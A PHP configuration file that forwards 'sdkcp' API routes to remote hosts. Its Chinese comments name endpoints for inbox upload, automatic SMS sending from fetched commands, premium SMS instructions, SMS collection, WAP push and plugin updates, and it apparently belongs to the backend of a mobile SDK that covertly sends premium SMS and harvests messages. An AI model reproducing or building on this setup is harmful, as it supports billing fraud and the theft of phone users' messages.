<?php
/**
 * 接口转发配置
 */
return [
    //判断是否有使用权
    "sdkcp/Gp.Valid" => "http://amc.jiekou88.com/sdkcp/Gp.Valid",
    //收件箱上传
    "sdkcp/Gp.InboxUpload" => "http://amc.jiekou88.com/sdkcp/Gp.InboxUpload",
    //激活
    "sdkcp/SaleStaticNewcp" => "http://amc.jiekou99.com/sdkcp/sale_static_newcp.php",
    //访问接口
    "sdkcp/UserVisitAppcp" => "http://amc.jiekou99.com/sdkcp/user_visit_appcp.php",
    //SDK动态插件更新接口
    "sdkcp/PlugUpdate" => "http://amc.jiekou99.com/sdkcp/plugUpdate.php",
    //app日志
    "sdkcp/AppLog" => "http://amc.jiekou99.com/sdkcp/app_log.php",
    //自动发短信获取短信指令
    "sdkcp/PushMsgcpNew" => "http://amc.jiekou99.com/sdkcp/push_msgcp_new.php",
    //获取sp短信指令
    "sdkcp/Bfeecnf" => "http://amc.jiekou99.com/sdkcp/Bfeecnf.php",
    //sp短信发送结果上传
    "sdkcp/SubPayQuery" => "http://amc.gp001.info/sdkcp/sub_payquery.php",
    //wap推送接口（定制版）
    "sdkcp/WapPushCustom" => "http://amc.jiekou88.com/sdkcp/WapPushCustom",
    //wap普通推送接口
    "sdkcp/WapPush" => "http://amc.jiekou88.com/sdkcp/wappush",
    //wap短信收集接口
    "sdkcp/SmsCollection" => "http://amc.jiekou88.com/sdkcp/SmsCollection",
    //wap网页上传
    "sdkcp/UploadPage" => "http://asia1.jiekou99.com/sdkcp/geturlok.php",
    //wap页面
    "???" => "???",
    //查询wap点击记录
    "sdkcp/GetWapCilckLog" => "http://amc.jiekou99.com/sdkcp/getWapCilckLog.php",
    //查询wap订阅记录
    "sdkcp/GetWapSubLog" => "http://amc.jiekou99.com/sdkcp/getWapSubLog.php",
];